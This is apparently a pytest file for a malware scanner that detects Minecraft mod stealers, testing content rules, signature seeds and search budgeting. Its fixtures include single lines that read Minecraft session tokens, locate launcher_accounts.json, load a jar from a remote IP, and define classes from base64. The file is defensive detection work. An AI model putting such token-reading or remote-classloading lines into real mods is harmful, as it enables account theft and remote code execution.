"""Minecraft mod/plugin malware: JVM content rules, Tier-2 gating, and discovery.

The end-to-end verdicts (stealer AUTO, alt manager / chat bridge / Maven library
loader not confirmed, base64 defineClass REVIEW) live in the precision corpus as
``*_mc_*`` fixtures. These tests pin the individual rule shapes.
"""

from __future__ import annotations

import json

import pytest
from conftest import utcnow
from test_hunt import TOOLS, FakeClient

from git_warden import config
from git_warden.db import Database
from git_warden.hunt import hunt
from git_warden.scanning.content_scanner import scan_content
from git_warden.scanning.discovery import _code_query, is_security_tool
from git_warden.scanning.screening import score_repo
from git_warden.scanning.signatures import load_seed_signatures


def _rules(tmp_path, name: str, line: str) -> set[str]:
    (tmp_path / name).write_text(f"class X {{ void f() {{ {line} }} }}\n", encoding="utf-8")
    return {f.rule for f in scan_content(tmp_path)}


@pytest.mark.parametrize("line", [
    "String t = Minecraft.getMinecraft().getSession().getToken();",           # MCP
    "String t = mc.getSession().getSessionID();",                              # MCP session id
    "String t = Minecraft.func_71410_x().func_110432_I().func_148254_d();",   # SRG
    "String t = MinecraftClient.getInstance().getSession().getAccessToken();",  # Yarn
    "String t = Minecraft.getInstance().getUser().getAccessToken();",          # Mojmap
    "val t = mc.session.let { client.getSession().getAccessToken() }",         # Kotlin-ish
])
def test_session_token_read_is_detected(tmp_path, line):
    assert "mc-session-token" in _rules(tmp_path, "Mod.java", line)


@pytest.mark.parametrize("line", [
    # Generic OAuth/web code: getAccessToken() without a Minecraft receiver.
    "String t = authentication.getUser().getAccessToken();",
    "String t = oauthSession.getAccessToken();",
    "String t = request.getSession().getAttribute(\"token\");",
])
def test_generic_access_token_is_not_minecraft(tmp_path, line):
    assert "mc-session-token" not in _rules(tmp_path, "Web.java", line)


def test_jvm_rules_do_not_fire_on_other_languages(tmp_path):
    # The JVM token rule is language-gated: a JS file quoting it is not a mod.
    (tmp_path / "notes.js").write_text(
        "// mc.getSession().getToken() is what ratters steal\n", encoding="utf-8")
    assert not any(f.rule == "mc-session-token" for f in scan_content(tmp_path))


def test_kotlin_sources_are_scanned(tmp_path):
    assert "mc-session-token" in _rules(
        tmp_path, "Mod.kt", "val t = mc.getSession().getToken()")


def test_launcher_account_store_is_language_agnostic(tmp_path):
    (tmp_path / "grab.py").write_text(
        'p = os.path.join(appdata, ".minecraft", "launcher_accounts.json")\n', encoding="utf-8")
    assert any(f.rule == "mc-launcher-accounts" for f in scan_content(tmp_path))


def test_launcher_profiles_is_not_a_credential_store(tmp_path):
    # Every Forge/Fabric installer writes launcher_profiles.json.
    (tmp_path / "Installer.java").write_text(
        'File f = new File(mcDir, "launcher_profiles.json");\n', encoding="utf-8")
    assert not any(f.rule == "mc-launcher-accounts" for f in scan_content(tmp_path))


def test_remote_classload_and_defineclass_rules(tmp_path):
    assert "jvm-remote-classload" in _rules(
        tmp_path, "L.java",
        'new URLClassLoader(new URL[]{new URL("http://203.0.113.7/u.jar")});')
    assert "jvm-decode-defineclass" in _rules(
        tmp_path, "H.java", "defineClass(null, Base64.getDecoder().decode(s), 0, n);")


def test_minecraft_seed_signatures_load():
    seeds = load_seed_signatures(config.MALWARE_SIGNATURES_PATH)
    mc = [q for q in seeds if "getToken" in q or "func_148254_d" in q
          or "getAccessToken" in q or "launcher_accounts" in q]
    assert len(mc) >= 5
    # Every seed carries a webhook/bot exfil term, so code search returns
    # steal-and-send candidates, not every account-switcher mod.
    assert all("webhooks" in q or "telegram" in q for q in mc)


def test_minecraft_screening_tokens_and_scanner_readmes():
    assert score_repo(name="fps-boost-ratter", full_name="a/fps-boost-ratter").signals
    assert is_security_tool(
        "A jar scanner for fractureiser and other malicious mods in your instance.")


def test_exhausted_signature_terms_rotate_out_of_the_budget(tmp_path, monkeypatch):
    # With a budget of 1, an exhausted first seed must yield its slot to the next
    # one; otherwise later seeds (the Minecraft family sits at the end of the
    # file) are never searched.
    sig_file = tmp_path / "sigs.json"
    sig_file.write_text(json.dumps([{"name": "a", "query": "FIRST"},
                                    {"name": "b", "query": "SECOND"}]), encoding="utf-8")
    monkeypatch.setattr(config, "MALWARE_SIGNATURES_PATH", sig_file)
    searched: list[str] = []

    class Client(FakeClient):
        def search_code(self, query, per_page=20, *, page=1, sort=None):
            searched.append(query)
            return []

    db = Database.open(tmp_path / "rot.sqlite")
    db.start_run("old", utcnow())
    db.advance_search_page(_code_query("FIRST"), 50, exhausted=True, run_id="old")
    hunt(db, Client(), TOOLS, run_id="rot", now=utcnow(), do_news=False, do_ioc=False,
         do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
         do_package_repos=False, do_signature=True, do_tier2=False, max_signatures=1)
    db.close()
    assert "SECOND" in searched and "FIRST" not in searched


def test_seed_family_filter():
    mc = load_seed_signatures(config.MALWARE_SIGNATURES_PATH, "minecraft")
    assert len(mc) == 6
    assert set(mc) < set(load_seed_signatures(config.MALWARE_SIGNATURES_PATH))
    assert load_seed_signatures(config.MALWARE_SIGNATURES_PATH, "MINECRAFT") == mc
    assert load_seed_signatures(config.MALWARE_SIGNATURES_PATH, "no-such-family") == []


def test_signature_family_jumps_ahead_of_learned_signatures(tmp_path, monkeypatch):
    # Learned signatures alone would fill the whole budget; the focused family
    # must still be searched, and first.
    sig_file = tmp_path / "sigs.json"
    sig_file.write_text(json.dumps([
        {"name": "x", "query": "OTHER"},
        {"name": "mc", "query": "MCSEED", "family": "minecraft"},
    ]), encoding="utf-8")
    monkeypatch.setattr(config, "MALWARE_SIGNATURES_PATH", sig_file)
    searched: list[str] = []

    class Client(FakeClient):
        def search_code(self, query, per_page=20, *, page=1, sort=None):
            searched.append(query)
            return []

    db = Database.open(tmp_path / "fam.sqlite")
    monkeypatch.setattr(db, "learned_signatures", lambda: ["L1", "L2", "L3"])
    hunt(db, Client(), TOOLS, run_id="fam", now=utcnow(), do_news=False, do_ioc=False,
         do_lineage=False, do_actor=False, do_enrich=False, do_osm=False,
         do_package_repos=False, do_signature=True, do_tier2=False, max_signatures=2,
         signature_family="minecraft")
    db.close()
    assert searched[0] == "MCSEED"
    assert "OTHER" not in searched
